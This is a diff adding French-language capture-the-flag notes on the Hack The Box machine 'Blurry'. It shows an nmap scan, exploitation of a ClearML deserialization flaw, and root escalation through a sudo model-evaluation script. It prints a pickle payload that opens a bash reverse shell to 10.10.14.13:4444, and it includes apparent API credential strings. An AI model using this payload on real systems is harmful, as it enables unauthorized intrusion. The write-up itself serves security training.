@@ -1,0 +1,130 @@
+10.10.11.19
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 20:56 CEST
+Nmap scan report for 10.10.11.19
+Host is up (0.018s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+80/tcp open  http    nginx 1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
+
+Site web app.blurry.htb
+
+Ce site utilise clearml qui est un outil qui permet de faciliter l'utilisation de machine learning
+
+Clearml est suscebtible d'etre vulnérable à la CVE CVE-2024-24590 (Deserialization of untrusted data can occur in versions 0.17.0 to 1.14.2 of the client SDK of Allegro AI’s ClearML platform, enabling a maliciously uploaded artifact to run arbitrary code on an end user’s system when interacted with.)
+
+Pour cela on teste un POC qui permet de créer un server clearml local avec lequel le serveur de la machine distante va communiquer afin de faire la rce
+
+Flemme d'ecrire tous ce que j'ai du changer afin de faire marcher le server clearml
+
+On va essayer de suivre les commandes du readme du serveur
+
+A6IKCUG5J3O3TMNGGRDAANYPH4OJBB
+8KKlNayBWErR6g308W23RIWT2SIzpHXkCi7PoKXsCRuz_7B4CyzQBHWY9_HHvLY
+
+Le serveur est enfin lancé
+
+On essaie l'exploit de RCE
+
+Depuis le debut fallait pas lancer de serveur en local mais utiliser le distant
+
+On retente l'exploit
+
+Rien marche
+
+J'ai beau changé de POC ça marche jamais
+
+Y a rien qui marche la machine pue ses grands morts ça casse les couilles
+
+Peu importe le payload rien fonctionne
+
+Y a pourtant vraiment des trucs qui se créent sur le site mais pas de rce
+
+ça vient de marcher pour aucune raison 
+
+On peut lancer la commande /usr/bin/evaluate_model avec comme argument /models/*.pth avec les droits sudo
+
+#!/bin/bash
+# Evaluate a given model against our proprietary dataset.
+# Security checks against model file included.
+
+if [ "$#" -ne 1 ]; then
+    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
+    exit 1
+fi
+
+MODEL_FILE="$1"
+TEMP_DIR="/opt/temp"
+PYTHON_SCRIPT="/models/evaluate_model.py"  
+
+/usr/bin/mkdir -p "$TEMP_DIR"
+
+file_type=$(/usr/bin/file --brief "$MODEL_FILE")
+
+# Extract based on file type
+if [[ "$file_type" == *"POSIX tar archive"* ]]; then
+    # POSIX tar archive (older PyTorch format)
+    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
+elif [[ "$file_type" == *"Zip archive data"* ]]; then
+    # Zip archive (newer PyTorch format)
+    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
+else
+    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
+    exit 2
+fi
+
+/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
+    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")
+
+    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
+        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
+        /bin/rm "$MODEL_FILE"
+        break
+    fi
+done
+
+/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
+/bin/rm -rf "$TEMP_DIR"
+
+if [ -f "$MODEL_FILE" ]; then
+    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
+    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
+fi
+
+On peut voir à la fin un appel vers la commande fickling
+
+On peut voir via le lien suivant que y a peut être un truc à faire https://github.com/trailofbits/fickling
+
+It looks like here, the .pth file we pass into our sudoable command is getting unzipped, and a .pkl file is getting extracted. Fickle is being used to scan that .pkl file for malicious content,and if it is considered safe then we scan the file with this python script, evaluate_model.py
+
+First of all, what is PyTorch, and what are these mysterious .pth files?
+
+From a quick google search, we can see that PyTorch is a machine learning library in python, and .pth files are generated from calling torch.save() on a model’s “state dictionary,” which is just a python dict in a PyTorch machine learning model that contains information about the model — specifically, it maps each layer to its parameter tensor, which is a multidimensional array. So, long story short… torch.save() take a data structure in python, and converts it to a format that can be saved on disk…?
+
+My good friends… we’ve just discovered serialization! We take a data object, and convert it to a simpler, more compact form that can easily be saved to disc or transmitted over a network. We can do this by turning yaml or json into strings, or, in the case of PyTorch, we take a model and turn it into a series of bytes that can later be loaded into another model.
+
+Reading through the pickle documentation above, we discover that pickle serializes objects via the object’s __reduce__() function. The __reduce__() function can be written to return a tuple —
+
+So. If we make our own class, rewriting the __reduce__ function, we can call whatever code we want. We can call whatever SYSTEM commands we want by returning os.system, and arbitrary commands. Since evaluate_model.py calls torch.load() on an arbitrary .pth file of our choice, we can run the following “create_evil.py” function:
+
+import torch
+import os
+
+class Payload:
+    def __reduce__(self):
+        return (os.system, ("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'",))
+
+evil = Payload()
+torch.save(evil, 'evil.pth')
+
+On lance ce script qui va permettre de créer un fichier .pth malicieux
+
+Puis on déplace le .pth au bon endroit puis on lance la commande sudo en ayant mit un listener sur le port 4444 puis ça lance un terminal en tant que root dans ce listener
+
+On a donc le flag root
+
